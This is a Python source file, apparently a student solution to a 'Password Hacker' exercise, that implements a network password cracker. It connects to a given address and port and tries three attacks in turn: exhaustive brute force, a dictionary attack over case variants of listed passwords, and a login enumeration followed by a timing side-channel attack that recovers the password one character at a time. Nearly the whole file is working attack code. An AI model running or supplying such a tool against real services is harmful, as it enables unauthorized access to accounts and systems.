import sys
import socket
import itertools
import string
import json
import random
from datetime import datetime

class PasswordCracker():
    def __init__(self):
        self.args = sys.argv
        address = self.args[1]
        port = int(self.args[2])
        self.upgraded_dict_based_attack(address, port)


    def brute_force(self, address, port):
        letters = (list(string.ascii_lowercase)+list(string.digits))
        with socket.socket() as client_socket:
            client_socket.connect((address, port))

            for x in range(1, (len(letters))):
                my_iterator = itertools.product(letters, repeat=x)
                for s in my_iterator:
                    word = "".join(s)
                    client_socket.send(word.encode())
                    response = client_socket.recv(1024)
                    if response.decode() == "Connection success!":
                        print(word)
                        sys.exit()


    def dict_based_attack(self, address, port):
        with socket.socket() as client_socket:
            client_socket.connect((address, port))
            with open(r'C:\Users\Michał\Desktop\Password Hacker\Password Hacker\task\hacking\passwords.txt', 'r') as passwords:
                for line in passwords:
                    passwd = line.strip('\n')
                    combi = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in passwd)))
                    for combination in combi:
                        client_socket.send(combination.encode('utf-8'))
                        response = client_socket.recv(1024)

                        if response.decode() == "Connection success!":
                            print(combination)
                            sys.exit()


    def upgraded_dict_based_attack(self, address, port):
        all_characters = list(string.ascii_letters + string.digits)
        passwd = ''
        admin_login = ''

        with socket.socket() as client_socket:
            client_socket.connect((address, port))

            with open(r'C:\Users\Michał\Desktop\Password Hacker\Password Hacker\task\hacking\logins.txt', 'r') as f:
                logins = f.read().split()

            for login in logins:
                data = json.dumps({"login": login, "password": " "})
                client_socket.send(data.encode('utf8'))
                response = json.loads(client_socket.recv(1024).decode('utf8'))
                if response["result"] == "Wrong password!":
                    admin_login = login
                    break

            loop1, loop2 = True, True
            while loop1:
                password = random.choice(all_characters)
                data = json.dumps({"login": admin_login, "password": (passwd + str(password))})
                start = datetime.now()
                client_socket.send(data.encode('utf-8'))
                response = json.loads(client_socket.recv(1024).decode('utf8'))
                finish = datetime.now()
                dif = (finish - start).microseconds
                if dif >= 10000:
                    passwd += password
                    loop2 = True
                    while loop2:
                        password = random.choice(all_characters)
                        data = json.dumps({"login": admin_login, "password": (passwd + str(password))})
                        start = datetime.now()
                        client_socket.send(data.encode('utf-8'))
                        response = json.loads(client_socket.recv(1024).decode('utf-8'))
                        finish = datetime.now()
                        dif = (finish - start).microseconds
                        if dif >= 10000:
                             passwd += password
                        if response['result'] == 'Connection success!':
                            passwd += password
                            loop1 = False
                            loop2 = False

            print(json.dumps({"login": admin_login, "password": passwd}))
            sys.exit()


if __name__ == '__main__':
    PasswordCracker()
